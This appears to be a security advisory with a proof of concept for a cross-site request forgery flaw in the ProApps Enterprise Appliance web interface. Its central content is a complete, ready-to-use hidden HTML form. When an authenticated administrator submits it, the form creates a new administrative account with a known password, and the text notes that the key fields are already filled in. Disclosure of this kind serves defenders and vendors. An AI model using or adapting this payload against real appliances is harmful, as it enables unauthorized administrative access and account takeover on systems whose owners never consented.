# Description Item:
```
Product Vendor: freebsdbrasil
Item: ProApps - Enterprise Appliance
Editor Creator: DreamWeaver
PHP: PHP Version 7.3.18 
Java Script Library: Jquery UI 1.6 | Jquery 1.2.6
Server: NGINX
Operational System: FreeBDS Unix
```

## Vulnerability Type:
Cross-Site Request Forgery (CSRF)

## Description Vulnerability:
CSRF can cause lot of consequences, depending on how the CSRF request is crafted and the application's behavior. In this case, it is a CSRF vulnerability that allows the creation of an administrative account on the web application, resulting in unauthorized access. To exploit a CSRF, the victim needs to be authenticated and have the "Users" management permission set to "Modified" (True).

## Exploitation:
Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.

As mentioned before, when an authenticated user clicks on the link, the malicious code will send a request to create a new user by the user's web browser. The code below creates a new administrative account in the vulnerable web application with the username `CSRF_POC` and the password `yourpassword`.
The code sends a crafted POST request to the `ger_user page` page with the parameters `login`, `password`, `password2`, `nome`, `gid` and `email` fields. It is important to mention that this page is responsible for creating new users or changing their passwords. Filling the other parameters is optional; all the important ones are already completed and ready to use.

NOTE: Leave the `gid` parameter is set to 1 to ensure that the account will have administrative permissions, however, it can be changed depending on how the environment is configured.

```
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send CSRF-POST Request</title>
</head>
<body>
    <form action="https://vulnerablesite.com/index.php?page=ger_user" method="POST">
        <!-- Campos do formulário -->
        <input type="hidden" name="task" value="save">
        <input type="hidden" name="boxchecked" value="0">
        <input type="hidden" name="hidemainmenu" value="0">
        <input type="hidden" name="search" value="">

        <input type="hidden" name="dados[id]" value="">
        <input type="hidden" name="dados[nome]" value="POC_CSRF">
        <input type="hidden" name="dados[login]" value="csrf_account">
        <input type="hidden" name="dados[email]" value="csfr@test.com">
        <input type="hidden" name="dados[gid]" value="1">
        <input type="hidden" name="dados[password]" value="yourpassword">
        <input type="hidden" name="dados[password2]" value="yourpassword">
        <input type="hidden" name="dados[block]" value="0">
        <input type="hidden" name="dados[block2]" value="0">
        <input type="hidden" name="dados[totp2fa]" value="0">
        <input type="hidden" name="dados[totp2fa_test]" value="">
        <input type="hidden" name="dados[totp2fa_key]" value="xxxxx">
        <input type="hidden" name="id" value="">
        <input type="hidden" name="option" value="ger_user">

        <!-- Botão para enviar a requisição -->
        <button type="submit">CSRF_POC</button>
    </form>
</body>
</html>
```

Once exploited, it is now possible to log into the application and obtain unauthorized access.

## Impact Vulnerability:
CSRF Cross-Site Request Forgery allows creation of an administrative account or account hijacking.

### References:
- https://portswigger.net/web-security/csrf
- https://owasp.org/www-community/attacks/csrf
- https://www.linkedin.com/pulse/from-csrf-account-takeover-unmasking-danger-cross-site-request-lylbf/

